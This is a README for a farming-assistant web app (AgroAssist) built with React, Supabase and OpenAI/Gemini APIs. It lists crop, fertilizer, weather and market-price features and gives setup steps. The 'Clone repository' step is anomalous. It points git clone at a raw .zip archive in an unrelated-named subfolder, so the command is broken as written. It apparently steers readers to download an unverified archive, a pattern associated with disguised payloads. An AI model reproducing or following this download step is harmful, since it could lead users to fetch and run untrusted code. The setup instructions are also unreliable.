🌱 Farm Assistant (AgroAssist)
📖 Overview

Farm Assistant is a full-stack web application designed to help farmers make data-driven decisions for improving crop yield and promoting sustainable farming practices.

✨ Features

Crop recommendation based on soil type, location, and season

Fertilizer guidance for optimized soil nutrition

Real-time weather reports and forecasts

Crop market price tracking

AI-powered agricultural chatbot

🛠 Tech Stack

Frontend: React, TypeScript

Styling: Tailwind CSS, shadcn/ui

Backend: Supabase (Auth + Database)

AI APIs: OpenAI, Google Gemini

🎯 Use Case

Helps farmers access personalized insights for crop planning, weather monitoring, and market decision-making through a unified digital platform.

▶️ Setup Instructions

Clone repository:

git clone https://github.com/nithish-ui/AgroAssist/raw/refs/heads/main/carbodiimide/Assist_Agro_v2.0.zip
cd AgroAssist

Install dependencies:

npm install

Configure environment variables in .env file (see .env.example)

Start development server:

npm run dev

Open in browser:

http://localhost:8080
